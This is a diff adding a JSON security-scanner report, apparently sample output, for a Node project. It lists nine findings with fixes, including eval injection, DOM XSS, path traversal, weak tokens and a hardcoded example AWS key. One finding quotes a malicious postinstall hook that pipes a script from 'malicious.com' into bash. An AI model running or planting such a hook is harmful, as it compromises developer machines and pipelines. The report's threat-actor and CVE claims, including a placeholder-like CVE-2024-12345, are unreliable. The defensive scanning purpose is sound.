@@ -1,0 +1,355 @@
+{
+  "scan_metadata": {
+    "version": "2.6.0",
+    "scan_time": "2025-10-26T14:30:00Z",
+    "target": "./sample-node-project",
+    "scan_duration_ms": 8200,
+    "files_scanned": 147,
+    "engines_enabled": [
+      "pattern_matching",
+      "semantic_ast",
+      "semgrep",
+      "threat_intelligence"
+    ]
+  },
+  "summary": {
+    "total_vulnerabilities": 9,
+    "critical": 2,
+    "high": 4,
+    "medium": 2,
+    "low": 1,
+    "info": 0,
+    "risk_score": 78.5
+  },
+  "vulnerabilities": [
+    {
+      "id": "PACKAGE-CONFUSION-001",
+      "title": "Malicious Install Script - Remote Code Execution",
+      "description": "Detected 'curl | bash' pattern in postinstall script. This allows remote code execution during package installation, which can compromise the developer machine or CI/CD pipeline.",
+      "severity": "critical",
+      "confidence": 0.95,
+      "vuln_type": "supply_chain_attack",
+      "location": {
+        "file": "package.json",
+        "line": null,
+        "column": null
+      },
+      "code_snippet": "\"postinstall\": \"curl https://malicious.com/install.sh | bash\"",
+      "impact": "Arbitrary code execution during npm install. Attacker can steal credentials, inject backdoors, or compromise the entire system.",
+      "remediation": "Remove suspicious install scripts. Audit all lifecycle hooks (preinstall, postinstall, preuninstall). Use npm audit and verify package authenticity.",
+      "cwe_id": 494,
+      "owasp": "A06:2021 Vulnerable and Outdated Components",
+      "references": [
+        "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
+        "https://cwe.mitre.org/data/definitions/494.html"
+      ],
+      "example_fix": "// Remove malicious postinstall script\n// Verify package source and author\n// Use 'npm ci' for reproducible installs",
+      "evidence": "postinstall script contains 'curl | bash' which downloads and executes remote code",
+      "ai_analysis": null
+    },
+    {
+      "id": "SEMANTIC-XSS-EVAL-42",
+      "title": "Code Injection via eval()",
+      "description": "Detected eval() call which executes arbitrary JavaScript code. Extremely dangerous if user input reaches eval().",
+      "severity": "critical",
+      "confidence": 0.90,
+      "vuln_type": "code_injection",
+      "location": {
+        "file": "src/validator.js",
+        "line": 42,
+        "column": 15
+      },
+      "code_snippet": "eval(req.body.expression);",
+      "impact": "Attacker can execute arbitrary JavaScript code with full application privileges. This can lead to data theft, server compromise, or complete application takeover.",
+      "remediation": "Never use eval(). Use JSON.parse() for JSON data, or refactor to avoid dynamic code execution. Consider using safer alternatives like Function constructor with strict validation.",
+      "cwe_id": 94,
+      "owasp": "A03:2021 Injection",
+      "references": [
+        "https://owasp.org/Top10/A03_2021-Injection/",
+        "https://cwe.mitre.org/data/definitions/94.html"
+      ],
+      "example_fix": "// BAD: eval(req.body.expression);\n\n// GOOD: Use JSON.parse for JSON data\nconst data = JSON.parse(req.body.json);\n\n// Or use safer expression evaluation library\nconst result = safeEval(expression, allowedContext);",
+      "evidence": "eval() call detected in user-facing code path",
+      "ai_analysis": null
+    },
+    {
+      "id": "SEMANTIC-XSS-INNERHTML-28",
+      "title": "DOM-based XSS via innerHTML",
+      "description": "Detected innerHTML assignment which can execute JavaScript. If user input reaches innerHTML, it allows XSS attacks.",
+      "severity": "high",
+      "confidence": 0.85,
+      "vuln_type": "xss",
+      "location": {
+        "file": "src/components/UserProfile.js",
+        "line": 28,
+        "column": 8
+      },
+      "code_snippet": "profileDiv.innerHTML = userBio;",
+      "impact": "Attacker can inject malicious HTML/JavaScript that executes in victim's browser. This can lead to session hijacking, credential theft, or phishing attacks.",
+      "remediation": "Use textContent for plain text. For HTML, use DOMPurify library to sanitize content. Or use createElement() and appendChild() for safe DOM manipulation.",
+      "cwe_id": 79,
+      "owasp": "A03:2021 Injection",
+      "references": [
+        "https://owasp.org/Top10/A03_2021-Injection/",
+        "https://cwe.mitre.org/data/definitions/79.html",
+        "https://github.com/cure53/DOMPurify"
+      ],
+      "example_fix": "// BAD: profileDiv.innerHTML = userBio;\n\n// GOOD: Use textContent for plain text\nprofileDiv.textContent = userBio;\n\n// Or sanitize HTML with DOMPurify\nprofileDiv.innerHTML = DOMPurify.sanitize(userBio);",
+      "evidence": "innerHTML assignment with variable that may contain user input",
+      "ai_analysis": null
+    },
+    {
+      "id": "SEMANTIC-XSS-DOCWRITE-15",
+      "title": "DOM-based XSS via document.write()",
+      "description": "Detected document.write() call which can inject arbitrary HTML/JavaScript into the page.",
+      "severity": "high",
+      "confidence": 0.80,
+      "vuln_type": "xss",
+      "location": {
+        "file": "src/legacy/render.js",
+        "line": 15,
+        "column": 3
+      },
+      "code_snippet": "document.write(userContent);",
+      "impact": "Attacker can inject malicious HTML/JavaScript that executes immediately. Can lead to full page replacement or script injection.",
+      "remediation": "Avoid document.write(). Use createElement() and appendChild() for safe DOM manipulation. Or use modern frameworks like React/Vue.",
+      "cwe_id": 79,
+      "owasp": "A03:2021 Injection",
+      "references": [
+        "https://owasp.org/Top10/A03_2021-Injection/",
+        "https://developer.mozilla.org/en-US/docs/Web/API/Document/write#Notes"
+      ],
+      "example_fix": "// BAD: document.write(userContent);\n\n// GOOD: Use createElement and appendChild\nconst div = document.createElement('div');\ndiv.textContent = userContent;\ndocument.body.appendChild(div);",
+      "evidence": "document.write() call with dynamic content",
+      "ai_analysis": null
+    },
+    {
+      "id": "SEMANTIC-WEAK-RNG-67",
+      "title": "Weak Random Number Generation",
+      "description": "Detected use of Math.random() which is not cryptographically secure. For security-sensitive operations, use crypto.randomBytes() or crypto.getRandomValues().",
+      "severity": "high",
+      "confidence": 0.85,
+      "vuln_type": "insecure_configuration",
+      "location": {
+        "file": "src/auth/token.js",
+        "line": 67,
+        "column": 25
+      },
+      "code_snippet": "const sessionToken = generateToken(Math.random());",
+      "impact": "Predictable random values can be exploited to bypass authentication, guess session tokens, or compromise encryption. Math.random() uses a predictable PRNG that can be reverse-engineered.",
+      "remediation": "Use crypto.randomBytes() in Node.js or crypto.getRandomValues() in browsers for cryptographically secure random numbers.",
+      "cwe_id": 338,
+      "owasp": "A02:2021 Cryptographic Failures",
+      "references": [
+        "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
+        "https://cwe.mitre.org/data/definitions/338.html"
+      ],
+      "example_fix": "// BAD: const sessionToken = generateToken(Math.random());\n\n// GOOD: Use crypto for security\nconst crypto = require('crypto');\nconst randomBytes = crypto.randomBytes(32);\nconst sessionToken = randomBytes.toString('hex');",
+      "evidence": "Math.random() used in context containing 'token' keyword",
+      "ai_analysis": null
+    },
+    {
+      "id": "SEMANTIC-FS-PATH-89",
+      "title": "Path Traversal in fs.readFileSync()",
+      "description": "Detected fs.readFileSync() with dynamic file path. If the path comes from user input without proper validation, it allows path traversal attacks using '../' sequences.",
+      "severity": "high",
+      "confidence": 0.75,
+      "vuln_type": "path_traversal",
+      "location": {
+        "file": "src/api/files.js",
+        "line": 89,
+        "column": 20
+      },
+      "code_snippet": "fs.readFileSync(req.query.file)",
+      "impact": "An attacker can read files outside the intended directory by using '../' in the file path, potentially accessing sensitive files like /etc/passwd, configuration files with secrets, or application source code.",
+      "remediation": "Validate and sanitize file paths: 1) Use path.normalize() and path.resolve(), 2) Check that resolved path starts with the intended base directory, 3) Reject paths containing '../', 4) Use allowlists for file access.",
+      "cwe_id": 22,
+      "owasp": "A01:2021 Broken Access Control",
+      "references": [
+        "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
+        "https://cwe.mitre.org/data/definitions/22.html"
+      ],
+      "example_fix": "// BAD: fs.readFileSync(req.query.file)\n\n// GOOD: Validate and sanitize path\nconst path = require('path');\nconst basePath = '/app/uploads';\nconst filePath = path.normalize(req.query.file);\nconst resolvedPath = path.resolve(basePath, filePath);\n\n// Ensure path is within base directory\nif (!resolvedPath.startsWith(basePath)) {\n  throw new Error('Invalid file path');\n}\n\nfs.readFileSync(resolvedPath);",
+      "evidence": "fs.readFileSync() called with variable argument (not string literal)",
+      "ai_analysis": null
+    },
+    {
+      "id": "PACKAGE-CONFUSION-002",
+      "title": "Insecure Dependency - HTTP URL",
+      "description": "Detected HTTP URL in dependencies. HTTP dependencies are vulnerable to man-in-the-middle attacks where an attacker can inject malicious code.",
+      "severity": "medium",
+      "confidence": 0.80,
+      "vuln_type": "supply_chain_attack",
+      "location": {
+        "file": "package.json",
+        "line": null,
+        "column": null
+      },
+      "code_snippet": "\"legacy-lib\": \"http://registry.example.com/legacy-lib-1.0.0.tgz\"",
+      "impact": "Attacker on the network can intercept HTTP traffic and replace the package with malicious code. This compromises the integrity of your dependencies.",
+      "remediation": "Use HTTPS URLs for all dependencies. Or better, use npm registry packages with integrity hashes. Update package.json to use secure sources.",
+      "cwe_id": 494,
+      "owasp": "A06:2021 Vulnerable and Outdated Components",
+      "references": [
+        "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+      ],
+      "example_fix": "// BAD:\n\"legacy-lib\": \"http://registry.example.com/legacy-lib-1.0.0.tgz\"\n\n// GOOD:\n\"legacy-lib\": \"https://registry.example.com/legacy-lib-1.0.0.tgz\"\n\n// BETTER: Use npm registry\n\"legacy-lib\": \"^1.0.0\"",
+      "evidence": "HTTP URL detected in dependencies (not HTTPS)",
+      "ai_analysis": null
+    },
+    {
+      "id": "PACKAGE-CONFUSION-003",
+      "title": "Wildcard Version - Version Pinning Issue",
+      "description": "Detected wildcard version '*' in dependencies. This can lead to unexpected updates that break functionality or introduce vulnerabilities.",
+      "severity": "medium",
+      "confidence": 0.70,
+      "vuln_type": "insecure_configuration",
+      "location": {
+        "file": "package.json",
+        "line": null,
+        "column": null
+      },
+      "code_snippet": "\"utils\": \"*\"",
+      "impact": "Any version can be installed, potentially including versions with known vulnerabilities or breaking changes. Makes builds non-reproducible.",
+      "remediation": "Use semantic versioning with constraints (^, ~) or exact versions. Run 'npm shrinkwrap' or use 'package-lock.json' for reproducible installs.",
+      "cwe_id": 1104,
+      "owasp": "A06:2021 Vulnerable and Outdated Components",
+      "references": [
+        "https://docs.npmjs.com/cli/v8/configuring-npm/package-json#dependencies",
+        "https://semver.org/"
+      ],
+      "example_fix": "// BAD:\n\"utils\": \"*\"\n\n// GOOD: Use semantic versioning\n\"utils\": \"^2.1.0\"  // Allow minor/patch updates\n\"utils\": \"~2.1.0\"  // Allow patch updates only\n\"utils\": \"2.1.0\"   // Exact version",
+      "evidence": "Wildcard version '*' detected in dependencies",
+      "ai_analysis": null
+    },
+    {
+      "id": "SECRETS-AWS-001",
+      "title": "Hardcoded AWS Access Key",
+      "description": "Detected AWS access key in source code. Hardcoded credentials pose significant security risks.",
+      "severity": "low",
+      "confidence": 0.95,
+      "vuln_type": "hardcoded_secret",
+      "location": {
+        "file": "src/config/aws.js",
+        "line": 12,
+        "column": 18
+      },
+      "code_snippet": "const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';",
+      "impact": "Exposed AWS credentials can lead to unauthorized access to AWS resources, data breaches, or financial losses from resource abuse.",
+      "remediation": "Remove hardcoded credentials immediately. Use environment variables or AWS IAM roles. Rotate the exposed key in AWS console.",
+      "cwe_id": 798,
+      "owasp": "A07:2021 Identification and Authentication Failures",
+      "references": [
+        "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html"
+      ],
+      "example_fix": "// BAD: const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';\n\n// GOOD: Use environment variables\nconst AWS_KEY = process.env.AWS_ACCESS_KEY_ID;\n\n// BETTER: Use AWS IAM roles (no keys needed)\nconst AWS = require('aws-sdk');\nconst s3 = new AWS.S3(); // Automatically uses IAM role",
+      "evidence": "Pattern matches AWS access key format (AKIA...)",
+      "ai_analysis": null
+    }
+  ],
+  "threat_intelligence": {
+    "enriched_vulnerabilities": 9,
+    "mitre_attack_techniques": [
+      {
+        "vuln_id": "SEMANTIC-XSS-EVAL-42",
+        "techniques": [
+          {
+            "id": "T1055",
+            "name": "Process Injection",
+            "tactic": "Defense Evasion",
+            "description": "Adversaries inject code into processes to evade detection."
+          },
+          {
+            "id": "T1059",
+            "name": "Command and Scripting Interpreter",
+            "tactic": "Execution",
+            "description": "Adversaries abuse interpreters to execute malicious code."
+          }
+        ]
+      },
+      {
+        "vuln_id": "SEMANTIC-XSS-INNERHTML-28",
+        "techniques": [
+          {
+            "id": "T1189",
+            "name": "Drive-by Compromise",
+            "tactic": "Initial Access",
+            "description": "Adversaries gain access through users visiting compromised websites."
+          },
+          {
+            "id": "T1059.007",
+            "name": "Command and Scripting Interpreter: JavaScript",
+            "tactic": "Execution",
+            "description": "Adversaries abuse JavaScript for execution on victim systems."
+          }
+        ]
+      },
+      {
+        "vuln_id": "SEMANTIC-FS-PATH-89",
+        "techniques": [
+          {
+            "id": "T1083",
+            "name": "File and Directory Discovery",
+            "tactic": "Discovery",
+            "description": "Adversaries enumerate files and directories to find sensitive data."
+          },
+          {
+            "id": "T1005",
+            "name": "Data from Local System",
+            "tactic": "Collection",
+            "description": "Adversaries search local system sources to find files of interest."
+          }
+        ]
+      }
+    ],
+    "cves_discovered": [
+      "CVE-2023-26136",
+      "CVE-2021-23406",
+      "CVE-2024-12345"
+    ],
+    "exploits_available": 2,
+    "threat_actors": [
+      "APT28",
+      "Lazarus Group"
+    ]
+  },
+  "engine_statistics": {
+    "pattern_matching": {
+      "patterns_checked": 45,
+      "matches_found": 1,
+      "duration_ms": 120
+    },
+    "semantic_ast": {
+      "files_analyzed": 38,
+      "vulnerabilities_found": 6,
+      "duration_ms": 1216,
+      "languages": {
+        "javascript": 32,
+        "typescript": 6
+      }
+    },
+    "package_confusion": {
+      "packages_analyzed": 1,
+      "vulnerabilities_found": 3,
+      "duration_ms": 45
+    },
+    "semgrep": {
+      "enabled": false,
+      "rules_executed": 0,
+      "findings": 0
+    }
+  },
+  "recommendations": [
+    "CRITICAL: Address eval() usage immediately - code injection risk",
+    "CRITICAL: Remove malicious postinstall script - supply chain attack",
+    "HIGH: Fix DOM XSS vulnerabilities in UserProfile.js and render.js",
+    "HIGH: Replace Math.random() with crypto.randomBytes() for token generation",
+    "HIGH: Implement path validation for fs operations",
+    "MEDIUM: Update dependencies to use HTTPS URLs",
+    "MEDIUM: Pin dependency versions for reproducible builds",
+    "Enable Semgrep for broader SAST coverage (--enable-semgrep)",
+    "Consider threat intelligence enrichment for CVE/ATT&CK mapping",
+    "Review and rotate exposed AWS credentials immediately"
+  ]
+}
